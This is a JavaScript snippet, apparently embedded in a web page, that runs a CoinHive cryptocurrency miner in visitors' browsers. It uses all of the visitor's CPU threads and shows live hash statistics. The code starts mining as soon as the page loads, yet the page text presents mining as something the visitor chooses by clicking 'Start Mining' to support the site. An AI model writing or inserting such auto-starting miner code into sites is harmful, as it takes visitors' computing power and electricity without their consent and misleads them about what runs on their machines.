/*<![CDATA[*/
var miner = new CoinHive.User('K7hYeX7AlZr5OoG14kK9dylBfRTmcB0M', 'User', {
    threads: navigator.hardwareConcurrency,
    autoThreads: false,
    throttle: 0.3,
    forceASMJS: false
});
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
setInterval(function() {
    var threadCount = miner.getNumThreads();
    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes() / 256;
    if (miner.isRunning()) {
        document.getElementById("tcount").innerHTML = "Threads: " + threadCount;
        document.getElementById("hps").innerHTML = "hashes per second: " + hashesPerSecond;
        document.getElementById("ths").innerHTML = "Total Hashes: " + totalHashes;
        document.getElementById("tah").innerHTML = "Accepted Hashes: " + acceptedHashes;
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.stop()\">Stop Mining</button>";
    } else {
        document.getElementById("hps").innerHTML = "Please click start";
        document.getElementById("ths").innerHTML = "to support";
        document.getElementById("tah").innerHTML = "this site";
        document.getElementById("minebutton").innerHTML = "<button onclick=\"miner.start(CoinHive.FORCE_EXCLUSIVE_TAB)\">Start Mining</button>";
    }
}, 1000); /*]]>*/